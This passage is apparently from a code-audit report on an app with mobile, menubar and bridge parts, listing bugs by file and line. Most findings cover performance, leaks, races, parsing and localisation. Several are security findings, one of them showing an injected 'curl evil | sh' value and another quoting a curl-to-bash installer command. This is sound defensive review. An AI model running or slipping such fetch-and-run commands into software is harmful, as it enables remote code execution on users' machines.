- `E-2/E04` **[perf]** `apps/mobile/lib/models/messages.dart:2590` — presentation getter uncached: ≥2 full indented JSON encodes per build
  presentation is recomputed on every access and summary+detailLines each trigger it; a multi-MB Write-approval input is re-encoded every frame causing dropped frames or OOM. Fix: late final + lazy rawDetails with a size cap.
- `C-1/C03` **[logic]** `apps/mobile/lib/models/messages.dart:3828` — PromptHistoryServerEntry drops envelope bridgeInstanceId; stats keys collide
  bridgeInstanceId lives only on the sync-result envelope and is discarded at entry parse; clientStats/sessionStats are keyed by bare ids so two Macs' use counts merge unconditionally (useCount + other.useCount) and pollute each other.
- `A-5` **[bug]** `apps/mobile/lib/models/messages.dart:3872` — PromptHistoryServerEntry stats double-layer bare Map casts stall sync forever
  Outer as Map<String,dynamic>? and inner value as Map both throw on shape changes; one bad entry discards the whole sync result so revision never advances and retries fail identically — permanent stall, not one lost prompt.
- `A4` **[bug]** `apps/mobile/lib/models/messages.dart:4271` — past_history content chain fully strict; AssistantContent bare casts
  c as Map plus AssistantContent.fromJson bare type/text/id/name/input; the `_` fallback only fires for non-null unknown type strings, so missing type or text discards the entire past_history frame — old session opens to 'Parse error' with zero history.
- `B03/B2` **[logic]** `apps/mobile/lib/models/messages.dart:4328` — Lexicographic ISO compares plus cache epoch-sort mismatch → list jumping
  RecentSession.created/modified string-compared in session_list_cubit and _maxIso in prompt_history_service; the sqflite cache sorts by epoch ms so cached vs live ordering disagree and the list visually jumps.
- `A5/F3` **[bug]** `apps/mobile/lib/models/messages.dart:4389` — effectivePermissionMode collapses unknown to acceptEdits on list and pending-resume screens
  RecentSession/SessionInfo effectivePermissionMode getters fall back through deriveExecutionMode which for codex always yields acceptEdits, even though Bridge now correctly returns permissionMode: undefined. Session list and session cards (session_list_screen.dart:222,1830; session_card.dart:102,469) therefore display 'on-request' for unknown sessions. Getters should return a nullable mode and UI should show a loading/unknown placeholder.
- `A3` **[bug]** `apps/mobile/lib/models/messages.dart:4402` — RecentSession.sessionId bare cast discards recent_sessions page
  One corrupt/new-format entry throws in the .map() at 1286 losing the whole recent_sessions frame; the embedded parse in session_link_resolution (1130) shares the path, breaking link-open navigation.
- `B02` **[logic]** `apps/mobile/lib/models/messages.dart:5873` — toLocal/toUtc strategy matrix conflict across four modules (dup)
  ServerChatEntry and chat_message_handler use toLocal while projection and unseen_sessions use toUtc; for naive strings the same message computes instants differing by one tz offset.
- `N-6` **[compat]** `apps/mobile/lib/models/mobile_update_models.dart:5` — OTA track 三处口径互不一致，经 CI 发出的补丁客户端永远收不到
  代码枚举是 {stable, owner}，patch.sh:67 发 --track=owner，而 .github/workflows/ios-patch.yml:11-15 的选项只有 [staging, stable] 默认 staging。CI 发出的补丁落在客户端不认的 track 上。
- **[bug]** `apps/mobile/lib/providers/machine_manager_cubit.dart:103` — No isClosed guards on 20+ emits; StateError after close in unawaited futures
  631 lines with zero isClosed checks while the rest of the repo has 63 such guards; startBridge/updateBridge SSH calls take 20-30s, and if the Cubit closes meanwhile (user exits, hot restart, test teardown) the late emit throws StateError inside an unawaited Future — an unhandled zone error. Fix: isClosed check after each await or a _safeEmit helper.
- **[l10n]** `apps/mobile/lib/providers/machine_manager_cubit.dart:245` — 6 SnackBar success messages hardcoded English in the cubit layer
  successMessage: 'Machine added successfully' and 5 similar strings at lines 245/276/287/336/413/483. Like bridge_service, the cubit should return semantic result codes for the UI layer to localize.
- `B-1` **[bug]** `apps/mobile/lib/providers/machine_manager_cubit.dart:309` — emit after 20-30s awaits without isClosed guard throws StateError
  startBridge (up to 20s in _waitForOnline), updateBridge (up to 30s), init, refreshAll, add/update/deleteMachine, and refreshLatestBridgeVersion all emit after long awaits with no isClosed check. Leaving the connection page during the wait closes the cubit and the emit throws 'Cannot emit new states after calling close'; a _safeEmit helper is the fix.
- **[leak]** `apps/mobile/lib/providers/machine_manager_cubit.dart:364` — _waitForOnline polling loop uncancellable after close; wall-clock deadline
  After close() the loop keeps issuing up to 30 checkHealth network calls at 1s intervals (and may trigger promptForPassword UI) then emits into a closed Cubit; DateTime.now()-based deadline is also affected by clock jumps. Fix: && !isClosed in the loop condition and a Stopwatch deadline.
- `D-8` **[bug]** `apps/mobile/lib/providers/unseen_sessions_cubit.dart:39` — _loadSeenAt catches only FormatException; close() rethrow leaks the Cubit
  MissingPluginException/PlatformException from SharedPreferences escape: all idle sessions get marked unread, _ready completes with an error later reported as unhandled, and close()'s await _ready rethrows so super.close() never runs — a real Cubit leak. Fix: catch-all with logging and catchError guards in close().
- **[l10n]** `apps/mobile/lib/services/bridge_service.dart:772` — 18 user-visible error messages hardcoded English in the service layer
  Strings like 'Bridge disconnected while preparing the file.' (6 times) and 'Bridge is not connected.' are emitted from a layer with no BuildContext. The fix is architectural: throw domain exceptions with error codes and map to ARB keys in the UI layer.
- `G-2/G01` **[bug]** `apps/mobile/lib/services/bridge_service.dart:1872` — Parse-error bubble exposes raw Dart TypeError and loses sessionId
  catch builds ErrorMessage('Parse error: $e') showing the raw type-cast error to users and posts sessionId=null (sessionId was read inside try, out of catch scope) so the error cannot be attributed to a session.
- `B-2` **[leak]** `apps/mobile/lib/services/database_service.dart:22` — database getter has no single-flight; duplicate openDatabase leaks handles
  _initialized is set only after the await, so cold-start high-frequency concurrent 'await _db' calls from PromptHistoryService each enter _initDatabase(); later writes to _database overwrite earlier ones whose Database handles are never closed. Memoizing an init Future fixes it.
- `E-1` **[perf]** `apps/mobile/lib/services/draft_service.dart:19` — Constructor synchronously base64-decodes all image drafts on the main isolate at startup
  DraftService(_prefs) calls _loadAll in the main.dart startup path, base64-decoding every image draft one by one. Multiple sessions with multi-MB image drafts stall the launch frame with ANR risk on Android; lazy decode or compute() is needed.
- `E-2` **[perf]** `apps/mobile/lib/services/draft_service.dart:88` — Every image draft save re-encodes base64+JSON on the UI thread into SharedPreferences
  A 5MB image builds a ~6.7MB base64 string on the UI thread on each save, and SharedPreferences/NSUserDefaults are unsuited to MB-scale blobs (Android rewrites the whole XML per commit). Images should go to app-private files with prefs storing only paths.
- `D-4` **[perf]** `apps/mobile/lib/services/draft_service.dart:98` — saveImageDraft/migrateImageDraft do base64Encode+jsonEncode synchronously in frame
  Both are void synchronous methods executing full base64Encode and jsonEncode within the frame, called directly from pickImageFromGallery (chat_input_with_overlays.dart:828), causing jank proportional to image size.
- `B4/D-2` **[bug]** `apps/mobile/lib/services/notification_approval_coordinator.dart:262` — Notification Allow/Reject needs session_list match but Bridge never broadcasts on permission_request
  _matchingSession requires session.pendingPermission.toolUseId to match, yet none of the 30 broadcastSessionList() call sites fire on permission_request or waiting_approval, and _drain never proactively calls requestSessionList(). A long-press Allow from a notification while the snapshot is stale queues for 10 minutes then silently expires — the user believes they approved but Bridge never received it; combined with B3 non-first approvals never match. Bridge should broadcast on permission_request and _drain should request a fresh list.
- `B-3` **[perf]** `apps/mobile/lib/services/prompt_history_service.dart:563` — getPrompts loads full table with 2 jsonDecodes per row and paginates in Dart
  Every page fetch runs db.query('prompt_history_cache') with no LIMIT/WHERE, decodes client and session stats JSON for every row, merge-sorts everything on the main isolate, then applies skip/take. With thousands of prompts scrolling visibly stutters; filters should be pushed into SQL. (Also listed as E-3.)
- `A-1` **[leak]** `apps/mobile/lib/services/ssh_bridge_tunnel_service.dart:71` — _ensureTunnel has no single-flight; concurrent calls leak SSH clients and ports
  Three awaits sit between the _tunnels check and write, so concurrent callers (30s health timer, _waitForOnline every second, syncAll, user taps) each build a tunnel and the later write overwrites the earlier one, leaving its _jumpClient, ServerSocket, and _serverSubscription never closed. updateBridge's health polling can leak dozens of tunnels in one operation.
- `A-2` **[leak]** `apps/mobile/lib/services/ssh_bridge_tunnel_service.dart:93` — closeAll races with in-flight tunnel creation; tunnel escapes all cleanup
  closeAll clears _tunnels then closes each, but an _ensureTunnel still awaiting _BridgeTunnel.start later registers its tunnel into the map after cleanup ran. That tunnel is neither closed by closeAll nor reachable by any other cleanup path; an epoch check after the await is needed.
- `A-3` **[bug]** `apps/mobile/lib/services/ssh_bridge_tunnel_service.dart:213` — Tunnel has no self-healing: jump SSH disconnect leaves a permanently dead tunnel
  _BridgeTunnel never listens to _jumpClient.done, and since the signature is unchanged _ensureTunnel keeps returning the dead tunnel. All machines behind the jump host become permanently unconnectable with no error surfaced (health check just shows offline) until app restart.
- `A-4` **[bug]** `apps/mobile/lib/services/voice_input_service.dart:33` — statusListener registered after listen(); _isListening can stick true forever
  If done/notListening fires during the awaited _speech.listen() (permission denied, immediate error, cancelOnError), the not-yet-installed statusListener never resets _isListening. The guard 'if (!_isAvailable || _isListening) return' then blocks voice input permanently and the mic icon stays in recording state.
- `E01/E1` **[perf]** `apps/mobile/lib/utils/composer_tokens.dart:191` — O(n^2) token scan compiling a RegExp per character freezes UI on long pasted text
  When a candidate token's category resolves to null, the scanner advances by one char instead of jumping to the token end, and _findTokenEnd rescans to end-of-string per boundary char; _isWhitespace/_isTokenBoundary construct a fresh RegExp on every single character. This runs inside buildTextSpan on every keystroke/frame with no cache, so pasting ~100KB of whitespace-free text (e.g. repeated ':$a:$b' or any '$' under Claude provider) fully freezes the main thread.
- **[perf]** `apps/mobile/lib/utils/composer_tokens.dart:401` — RegExp compiled per character inside per-keystroke tokenizer loop
  _isWhitespace and _isTokenBoundary each construct a new RegExp per call, and parseComposerTokens runs from buildTextSpan on every keystroke/rebuild: 500 chars input means 500+ regex compilations per frame. Fix: top-level final RegExp or code-unit checks.
- `A-7/E02/E2` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:181` — contains('diff --git') vs startsWith('diff --git ') asymmetry empties whole diff
  If a diffed file's content merely mentions 'diff --git' (README, CLAUDE.md, patch docs), L181 selects multi-file mode but no line startsWith('diff --git '), so the while loop consumes everything and parseDiff returns []. Git panel and Edit preview show blank with no error; summarizeDiffSelection returns all zeros.
- **[perf]** `apps/mobile/lib/utils/diff_parser.dart:462` — summarizeDiffSelection fully parses the diff on every input-bar build
  _DiffPreview.build (chat_input_bar.dart:670) calls it per rebuild (every keystroke/IME composition), splitting the whole attached diff and constructing all DiffFile/DiffHunk/DiffLine objects just to get 3 integers; a multi-MB diff drops frames. Fix: single-pass streaming count or cache in DiffSelection.
- `A2` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:569` — Bare 'as String' on old_string/new_string/content; null-on-malformed contract broken
  Lines 569-570, 586-587, and 595 cast tool-input fields with bare as String, so any non-string value (e.g. future content-block arrays for Write.content) throws. synthesizeEditToolDiff's doc claims it returns null on malformed input but has no try/catch to honor that.
- **[perf]** `apps/mobile/lib/utils/file_mention_matcher.dart:29` — Regex compiled per candidate in @-mention scoring over thousands of files
  scoreFileMentionPath is called per projectFile from build() (thousands in big repos); _compactForFuzzyMatch builds RegExp(r'[^a-z0-9]') and does replaceAll twice per candidate, and query lower/trim/compact are recomputed per candidate — thousands of regex compilations per keystroke plus toList()..sort(). Fix: hoist regexes, precompute query object, memoize scores.
- `D-4` **[perf]** `apps/mobile/lib/widgets/bubbles/assistant_bubble.dart:485` — Image.memory(contentAsBytes()) inside build re-decodes base64 every rebuild
  At :485 and :745 the data URI is decoded inside build, producing a fresh Uint8List each rebuild which invalidates the ImageCache key and forces a full image re-decode. The bytes should be memoized in State.
- `4/D-2/D2` **[bug]** `apps/mobile/lib/widgets/bubbles/image_preview.dart:58` — httpBaseUrl prepended to data: URLs; inline data images always broken
  '$httpBaseUrl${image.url}' produces http://host:8080data:image/png;base64,... so _decodeDataImageUrl's startsWith('data:image/') never matches and rendering falls to ExtendedImage.network which fails. Same defect at image_preview.dart:120,168 and message_images_screen.dart:167,251; the correct _resolveImageUrl pattern exists in generated_image_preview_mapper.dart.
- **[l10n]** `apps/mobile/lib/widgets/session_card.dart:209` — Remaining hardcoded-English clusters: 17 files, ~80 strings across widgets/features
  Concentrations include session_card.dart (11), branch_selector_sheet.dart (9), worktree_list_sheet.dart (8), new_session_sheet.dart (7), commit_bottom_sheet.dart (6), screenshot_sheet.dart (6, whose zh translations sit in the orphan keys), messages.dart approval titles (5), qr_scan_screen.dart (4), theme_bottom_sheet.dart (4), explore_screen.dart (4), diff_image_widget.dart (4), session_mode_bar.dart (4), licenses_screen.dart (3), git_file_list_sheet.dart (3), codex_settings_sheet.dart (3), plan_card.dart (1), workspace_shell_screen.dart accessibility labels (2). All shown in English to every locale.
- **[l10n]** `apps/mobile/lib/widgets/session_visual_status.dart:47` — Session status labels hardcoded English while zh translations exist as orphan keys
  'Needs You'/'Working'/'Ready' are hardcoded although statusNeedsYou/statusWorking/statusReady already have Chinese translations among the 77 orphan zh keys. Adding the keys to en/ja/ko and swapping in the getters is low cost, high yield.
- **[l10n]** `apps/mobile/lib/widgets/slash_command_sheet.dart:83` — 43 slash command descriptions hardcoded English for all four languages
  The const knownCommands map hardcodes descriptions like 'Compact conversation'. Command names should stay verbatim but descriptions belong in ARB, which requires refactoring the const map into runtime construction.
- `D1` **[compat]** `apps/mobile/pubspec.yaml:92` — dependency_overrides points irondash at a third-party fork with ref: HEAD
  irondash_engine_context is overridden to github.com/Sabbar-Engineering/irondash following the fork's default branch, so any flutter pub upgrade silently pulls that repo's newest code into the build; irondash underlies super_clipboard/super_drag_and_drop handling clipboard and drag-drop data. Pin ref: to the resolved commit SHA (3c8667f...) and track upstream merge to drop the override.
- `7.2` **[test-gap]** `apps/mobile/test` — 系统性测试夹具反模式：夹具形态与生产数据不符，已掩盖 3 个真实 bug
  P0-1（夹具两行相距 15 行，掩盖 U3/U0 hunk 划分分歧）、P0-20（RunnerTests.swift:322 用无小数秒字面量）、P0-21（完全无测试）均因夹具形态与生产不同而通过全绿测试。全库统计：测试中不带小数秒的 ISO 字面量约 130 次、带小数秒约 90 次，两种形态混用无统一约定。需要夹具由生产代码路径生成、边界形态优先、跨语言边界双向契约测试三条纪律及对应 lint。

### iOS native

- `A12` **[bug]** `apps/mobile/ios/Runner/ArtifactQuickLookPlugin.swift:85` — activeSession has no timeout/fallback reset; one missed dismissal locks 'busy' forever
  activeSession is only cleared via previewControllerDidDismiss/presentationControllerDidDismiss/presentation failure; if the controller is dismissed by the system or a parent VC (fullScreen style does not fire the delegate), activeSession stays non-nil and every subsequent preview returns FlutterError(busy). Also overwrites QLPreviewController's own presentationController delegate.

### menubar

- `N-7` **[test-gap]** `apps/menubar` — apps/menubar 全目录零测试，P0-10 与 P0-21 都因此逃逸
  `find apps/menubar -iname "*test*"` 无结果。BridgeProcessManager 的管道死锁与 UsageInfo 的日期解析 bug 都没有任何测试覆盖，属长期零覆盖模块。
- `C6` **[perf]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:11` — shell/runDoctorCLI block Swift cooperative thread pool inside continuation
  Both nonisolated async helpers run waitUntilExit() synchronously on a cooperative-pool thread inside withCheckedThrowingContinuation, blocking up to 600s per call. The pool has only CPU-count threads, so a few concurrent installs exhaust it and stall the entire async runtime. Wrap in Task.detached/dedicated queue or use terminationHandler-driven async collection.
- `C3/F2` **[bug]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:65` — Home-directory plist path unquoted when spliced into launchctl shell command
  plistPath (NSHomeDirectory()-based) is interpolated unquoted into `launchctl load \(plistPath)` shell strings at lines 65/70/77. A home directory containing spaces or special characters splits the argument, so bridge start/stop silently fails; a controllable path is equivalent to injection. Use argument arrays or at least quoting.
- `C2/F1` **[bug]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:80` — setupService interpolates port/apiKey into zsh -li -c string (command injection)
  setupService builds the npx setup command by string interpolation of port/apiKey into a string handed to `zsh -li -c`, with no quoting or escaping. Currently unreachable (UI calls setupBridge() with nils) but any future wiring of an API-key field lets a pasted `abc; curl evil | sh` run arbitrary code; CLI args also leak secrets via ps. Fix by switching to Process.arguments arrays.
- `C4` **[bug]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:110` — Homebrew installed via curl|bash from HEAD with no checksum/pin in unsandboxed app
  installNodeViaHomebrew runs `/bin/bash -c "$(curl -fsSL .../Homebrew/install/HEAD/install.sh)"` silently from the GUI (DoctorViewModel.swift:321 triggers it) with no signature, checksum, or version pin. A hijacked GitHub raw endpoint means local RCE with full user privileges. Should route through openTerminalGuide or pin to a commit SHA with sha256 verification.
- `C7` **[bug]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:142` — Interactive commands (brew install, claude/codex login) run without TTY and cannot work
  The Homebrew install script needs RETURN confirmation and sudo (fails with 'no tty present'), and `claude auth login`/`codex --login` are interactive TTY flows, yet all are launched via Process+Pipe with no pseudo-terminal or stdin (lines 110-115, 142-152). They fail immediately or hang to the 120s timeout. Route these through openTerminalGuide or a real Terminal.
- **[bug]** `apps/menubar/CCPocketMenubar/Services/NetworkDiscovery.swift:60` — Connection credentials shown as plaintext QR+text; key in UserDefaults; tokenless ws:// broadcast
  buildConnectionURL embeds the API key as token= in ccpocket://connect, rendered both as QR and as selectable plaintext Text (QRCodePageView.swift:81); the key is stored in UserDefaults plist, not Keychain. Worse, since bridgeApiKey is never written (F14), today the QR is a token-less ws:// LAN address while Bridge defaults to 0.0.0.0 with no key — advertising an unauthenticated CLI-execution endpoint to the LAN. Needs Keychain storage, masked display, and a red warning when no API key is configured.
- `C5` **[bug]** `apps/menubar/CCPocketMenubar/Views/QRCodePage/QRCodePageView.swift:52` — Connection credentials rendered in plaintext; API key stored in UserDefaults
  The ccpocket://connect?url=ws://...&token=<key> string is both QR-encoded and shown as selectable plaintext Text (leaking via screenshots/screen share), and the key source is UserDefaults, not Keychain. Worse, since bridgeApiKey is never written (C9), today's QR is a token-less ws:// address advertising an unauthenticated Bridge entry point to the whole LAN when the Bridge has no API key.

### Other

- `C-1` **[bug]** `functions/src/index.ts:308` — handleRegister never verifies FCM token ownership: push forgery/phishing possible
  Registration only format-checks the token, so anyone with a Firebase anonymous UID can register a victim's FCM token (tokens leak into logs/memory/Firestore) under their own bridge and send arbitrary title/body, even eventType=approval_required with plausible permissionId to attach the approval category. Final approval is still protected by the bridge-side pending recheck, but UI spoofing and harassment stand.


## P2（343 条）

### Bridge

- `A10` **[logic]** `packages/bridge/src/artifact-http.ts:33` — Sandbox CSP blocks same-directory relative assets, producing half-broken pages
  SANDBOXED_HTML_CSP has default-src 'none' with no 'self', and /sandbox is a single-file route, so <img src="chart.png"> and relative stylesheets are all blocked. Most agent-generated HTML reports are not self-contained, so users see image-less unstyled pages and judge preview as failed, with no UI hint that resources were blocked.
- `A-5` **[logic]** `packages/bridge/src/background-notification-projector.ts:120` — ExitPlanMode classified as approval_required; notification Allow degrades semantics
  ExitPlanMode gets a permissionId and thus the ccpocket_approval_v1 category on mobile, letting users approve a plan from the notification with a bare ClientMessage.approveLiveOnly(), while the in-app flow includes permission-mode selection. It should use a distinct eventType (e.g. plan_ready) without the approval category.
- `S-1` **[bug]** `packages/bridge/src/bridge-http-auth.ts:93` — 私有 HTTP 兜底授权基于源 IP，共享出口地址即可无 token 访问
  授权判定基于"源 IP 曾有认证 WS 连接"。Tailscale exit node / NAT / 跳板机后共享出口地址的任意主机可无 token 访问 /usage、/doctor、/api/gallery（可下载全部截图）。
- `D1-test` **[test-gap]** `packages/bridge/src/codex-desktop-continuity.test.ts:2154` — No test covers same-socket dual-owner watch displacement (tracker vs chat cubit)
  Existing tests at codex-desktop-continuity.test.ts:2154 cover only single-owner watch/unwatch/supersede CAS; the D1 race — home-list tracker and chat cubit alternately displacing each other on one WebSocket client — has no integration test, and the report explicitly recommends adding one alongside the D1 fix.
- `E4` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:306` — Rollout errors silently swallowed when closed/aborted/stale-intent — zero server trace
  The catch returns with no log and no event whenever this.closed, signal.aborted, or !isCurrentWatchIntent — and stale-intent is the high-frequency branch of the D1 race. Clients can only discover the failure via the 4s ack timeout and operators have no server-side evidence at all. At minimum a debug log is needed.
- `D7` **[leak]** `packages/bridge/src/codex-desktop-continuity.ts:463` — Tracker never sends unwatch; monitors keep polling rollouts of dead sessions
  requestCodexDesktopContinuityUnwatch has exactly one caller (chat_session_cubit.dart:606); DesktopSessionListContinuityTracker only clears local maps on session removal/close/disconnect, so Bridge-side WatchRegistration/WatchIntent/monitor (fs.watch + 750ms interval + fd) survive until the socket drops, and hasCurrentWatchIntentForThread stays true blocking disposeMonitorIfUnused — even after evictStaleIdleSessions destroyed the session.
- `D10` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:506` — monitorFor MAX_MONITORS check precedes awaits; concurrent creations exceed the cap
  The size check happens before await resolveRolloutPath and await monitor.start(), so concurrent calls for different threadIds all pass then each monitors.set, exceeding 64. Eviction also only considers watcherCount===0 monitors and throws when all have watchers, feeding D3's retry storm.
- `D5` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:726` — onMonitorEvent resolves monitor by threadId instead of event source identity
  The onEvent closure captures only threadId and onMonitorEvent looks up this.monitors.get(threadId), which may already be a new monitor after a D1-style close/recreate; delayed callbacks from the old monitor (queueMicrotask flush, pending timers) can then broadcast old events to the new monitor's watchers. Currently only saved by each flush's if(this.closed) check — accidental, not structural, safety. Fix: capture the monitor instance and compare identity on entry.
- `D8` **[perf]** `packages/bridge/src/codex-desktop-continuity.ts:1447` — consumeText recomputes Buffer.byteLength of whole lineBuffer per chunk (O(n^2)); oversize lines dropped silently
  With MAX_LINE_BYTES=2MB and READ_CHUNK_BYTES=64KB, a 2MB line triggers 32 full-string byte-length rescans; lines exceeding the cap are then discarded with no warning or degradation event, so a large Desktop tool output silently vanishes. Fix: incremental byte counter and an explicit truncation notice.
- `D9` **[l10n]** `packages/bridge/src/codex-desktop-continuity.ts:2728` — boundedText truncates on raw byte boundary, producing U+FFFD in CJK/emoji text
  Buffer.from(value).subarray(0, maxBytes).toString('utf8') can cut a multi-byte character in half, yielding replacement characters at the truncation point. This is the only real encoding-truncation defect in the pipeline (transport/delta paths verified correct). Fix: StringDecoder or back off to the nearest code-point boundary.
- `12` **[leak]** `packages/bridge/src/codex-process.ts:608` — startedToolItems Map unbounded; interrupted turns accumulate entries forever
  Entries are deleted only in ensureStartedToolUse and cleared in prepareLaunch; items started but never completed (turn interrupted/failed) accumulate for the session's lifetime with no capacity cap, unlike sibling maps (emittedGuardianReviewIdOrder capped at 256, expectedGoalNotifications at 64).
- `10` **[bug]** `packages/bridge/src/codex-process.ts:1075` — persistRuntimeThreadSettings chain lacks onRejected; rejection poisons session
  Unlike updatePermissionSettingsForNextTurn (905-921) which handles both branches, this chain has success-only .then handlers. If operation ever rejects, _pendingRuntimeThreadSettingsUpdate is never cleared so waitForPendingThreadSettingsUpdates re-awaits the same rejected promise and every subsequent input hits the set_permission_mode_rejected branch at 3391 and is dropped, permanently poisoning the session (plus an unhandled rejection). Also core-report E2(second pass).
- `16` **[logic]** `packages/bridge/src/codex-process.ts:1326` — Unmatched goal notification dirties all in-flight cleared expectations
  consumeExpectedGoalNotification's .map marks every 'cleared' expectation with interveningGoalEvent:true even when index === -1 (no match). One unmatchable thread/goal/updated (e.g. server payload field drift breaking sameCodexGoal) taints all pending clear expectations, forcing an extra thread/goal/get roundtrip plus an extra goal_state broadcast for each later legit clear.
- `A11` **[bug]** `packages/bridge/src/codex-process.ts:1818` — bootstrap/runInputLoop never check _runtimeGeneration; stale bootstrap writes into new runtime
  prepareLaunch increments _runtimeGeneration and resets stopped=false, but no await continuation in bootstrap compares the generation (grep-confirmed), so on repeated start() the old bootstrap resumes, passes the stopped guard, and writes old config/emits messages against the new transport/thread. Latent today (session.ts starts once) but the API (including initializeOnly) exposes it.
- `9/A9` **[bug]** `packages/bridge/src/codex-process.ts:1971` — Crash exit path never clears pendingApprovals/pendingUserInputs; dead approval popup
  stop() clears both Maps but transport.on('exit') (crash path) only calls rejectAllPending and sets idle. session.ts:1361's list() keeps reporting getPendingPermission(), so the phone shows an approval dialog that can never work — approve() reaches writeEnvelope which throws 'not running' and is swallowed as a warn. Also second-pass A12.
- `14` **[bug]** `packages/bridge/src/codex-process.ts:2186` — Approve/reject delete pending entry before responding; failure still reports Approved
  The approval paths delete from pendingApprovals then call respondToServerRequest, which merely console.warns when the transport is dead, and emitToolResult('Approved') runs regardless. The user sees an approval succeed while the app-server never received the decision, and the deleted entry cannot be retried. Also core-report E7(second pass).
- `15` **[bug]** `packages/bridge/src/codex-process.ts:2279` — installToolSuggestion can stay in installing forever; plugin/install has no timeout
  When installState is 'installing' the function returns early, and this.request('plugin/install', ...) is issued without timeoutMs. If the app-server never replies, the elicitation stays 'installing' permanently, approve() becomes a silent no-op, and status remains waiting_approval.
- `E6` **[bug]** `packages/bridge/src/codex-process.ts:2400` — approve/reject/answer without toolUseId resolve against arbitrary first Map entry
  resolvePendingApproval(undefined) returns pendingApprovals.values().next().value; with multiple concurrent pending approvals (parallel tool calls), a legacy client's id-less approve acts on whichever entry iterates first — the user approves A but actually releases B. Fix: refuse id-less resolution when more than one pending exists.
- `E7/A14` **[leak]** `packages/bridge/src/codex-process.ts:2887` — bootstrap tail setTimeout(25) and action.startTimeout (1547) never unref'd or cleared
  The 25ms bootstrap-tail timer is not unref'd, not tracked, and not cleared in stop(); action.startTimeout at 1547 is likewise not unref'd while sibling timers (3891, 4842) are. These keep the event loop alive and can fire against a stopped instance.
- `13` **[leak]** `packages/bridge/src/codex-process.ts:3199` — requestOrNull Promise.race never clears timers nor cancels underlying RPC
  Each completion fetch leaves three un-unref'd 10s timers keeping the event loop alive after stop(), and on timeout the pendingRpc entry is never deleted (request() called without timeoutMs), so the Map grows monotonically when the app-server doesn't reply. Also core-report E8(second pass).
- `A8` **[bug]** `packages/bridge/src/codex-process.ts:3416` — pendingTurnCompletion has no watchdog; missing turn/completed stalls loop forever
  The await in runInputLoop is released only by handleTurnCompleted or rejectAllPending. Codex is known to occasionally drop turn/completed; when that happens the loop never emits input_ready again and the session appears permanently running. Suggest a turn watchdog (e.g. no item events for 10 min => fail) or reset on thread/started.
- `17` **[bug]** `packages/bridge/src/codex-process.ts:3527` — Single try wraps JSON.parse and handleRpcEnvelope; business errors masked as parse errors
  Any exception thrown by notification/approval handling inside handleRpcEnvelope is caught by the same catch as JSON.parse and reported as 'Failed to parse codex app-server output', silently dropping that notification and permanently disguising real bugs as protocol parse problems. Also core-report E3(second pass).
- `18` **[bug]** `packages/bridge/src/codex-process.ts:4332` — pendingPlanCompletion overwritten without resolving prior plan approval
  A new plan completion assigns over any existing pendingPlanCompletion without emitting permission_resolved or a synthetic tool_result for the old toolUseId, so the old plan's permission_request hangs on the client forever and its toolUseId can no longer be matched by approve/reject (2168-2171 compares only the current one). Also core-report E12.
- `11` **[bug]** `packages/bridge/src/codex-process.ts:4423` — Id-less items get different randomUUIDs at started vs completed
  processItemStarted (4423) and processItemCompleted (4490) each generate a fresh randomUUID when item.id is missing, so ensureStartedToolUse never matches: the UI shows a duplicate tool_use card, the started entry's tool_result never arrives, and the entry leaks in startedToolItems. Also core-report E11.
- `D3` **[bug]** `packages/bridge/src/codex-process.ts:5019` — approve_always on a Permissions request fixes agent-requested escalation for whole session
  scope becomes 'session' for acceptForSession, so tapping 'always allow' on a Permissions-type request permanently grants the agent-requested expanded permissions for the session rather than one turn. UI should hide 'always allow' when toolName === 'Permissions'.
- `B-9` **[logic]** `packages/bridge/src/conversation-content-sync.ts:328` — pendingRevisions 永不超时，客户端在内容变化前永远拿不到数据
  revision 是内容哈希；客户端应用层丢弃消息（未 ack 也未断线）后，同内容重建被 :607-609 跳过，focus 也只是 enqueue → 再次跳过。次要：ack 仅接受严格相等（:343-344），略旧但仍在缓存中的 revision 被丢弃，cursor 无法前移。
- `B-11` **[perf]** `packages/bridge/src/conversation-content-sync.ts:555` — drain 单飞且 historyReader 无超时，一个大 rollout 饿死所有其他会话
  `await this.historyReader(task)` 无超时/字节上限；数百 MB rollout 全量解析期间，其他会话（含其他客户端 priority=0 的 focused 任务）全部排队，priority 只在两次读之间生效。
- `B-10` **[perf]** `packages/bridge/src/conversation-content-sync.ts:601` — 推送无背压，且 change 驱动推送不受 hotConversationLimit 约束
  全程不检查 bufferedAmount，publishSnapshot 同步循环发给所有 interactive 客户端，慢客户端数据无上限堆积。hotConversationLimit=10 只管 warm 阶段（:487-503），桌面端任何本地 CLI 会话的写盘活动都会把整窗快照（最多 755 条）推给所有手机客户端。
- `R-4.1` **[bug]** `packages/bridge/src/debug-trace-store.ts` — 调试轨迹始终开启无门禁，15 处调用点无条件写盘
  recordingStore 由 BRIDGE_RECORDING 控制，而 debugTraceStore 没有任何开关。websocket.ts 中 15 处 recordDebugEvent 全部无条件写盘，其中 send()(:11603) 对每一条出站消息、trackSessionMessage()(:10029) 对每一条会话消息各记一次。
- `R-4.4` **[bug]** `packages/bridge/src/debug-trace-store.ts:21` — 轨迹目录/文件未指定 mode，落到默认 umask（0755/0644 全局可读）
  mkdir(:21-22) 与 writeFile/appendFile(:39,57) 均未指定 mode。同一代码库里 file-mutation-auth.ts 对密码文件用 O_NOFOLLOW|O_EXCL + 0600 + fsync + 原子 rename，而包含对话正文的轨迹文件是全局可读的。
- `R-4.3/R-4.5` **[leak]** `packages/bridge/src/debug-trace-store.ts:53` — traces/*.jsonl 与 bundles/*.json 无 prune/retention/大小上限
  appendFile 永久追加、每次请求一个 bundle 文件，磁盘侧完全无上限；而内存侧有 MAX_DEBUG_EVENTS=800 的上限（websocket.ts:12010-12013），这个不对称属明确遗漏。用户当前数据规模已达 26 GiB × 2。
- `A-7` **[bug]** `packages/bridge/src/ephemeral-side-chat.ts:130` — Ephemeral registry has no owner; any client can close another client's child
